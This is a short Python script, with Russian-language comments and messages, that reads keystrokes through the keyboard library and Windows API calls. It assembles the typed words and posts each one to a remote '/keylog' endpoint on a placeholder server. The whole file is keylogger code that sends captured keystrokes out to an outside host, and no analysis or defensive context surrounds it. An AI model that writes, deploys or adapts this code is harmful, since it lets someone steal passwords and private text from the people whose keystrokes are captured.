import keyboard
import requests
import ctypes
import time

SERVER_URL = 'http://server_ip:5000/keylog'


def get_char():
    user32 = ctypes.WinDLL('user32', use_last_error=True)
    kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)

    buf = ctypes.create_unicode_buffer(8)
    state = (ctypes.c_byte * 256)()
    user32.GetKeyboardState(ctypes.byref(state))

    vk = user32.VkKeyScanW(ord(keyboard.read_event(suppress=True).name[0]))
    sc = user32.MapVirtualKeyW(vk & 0xff, 0)

    result = user32.ToUnicode(vk & 0xff, sc, state, buf, len(buf), 0)
    return buf.value if result > 0 else ''


print("Начните ввод. Для выхода нажмите ESC.")

while True:
    word = ""
    while True:
        event = keyboard.read_event()
        if event.event_type != keyboard.KEY_DOWN:
            continue

        key = event.name

        if key == "esc":
            print("Выход...")
            exit()
        elif key == "space":
            print(f"Отправка: {word}")
            try:
                requests.post(SERVER_URL, data=word)
            except Exception as e:
                print(f"Ошибка при отправке: {e}")
            break
        elif len(key) == 1 or key in ['space', 'enter', 'tab']:  # только текстовые символы
            try:
                # Пробуем получить символ по раскладке
                char = keyboard.get_typed_strings([event])
                char = next(char, '')  # Получить из генератора
                word += char

            except:
                pass
        elif key == "backspace":
            word = word[:-1]
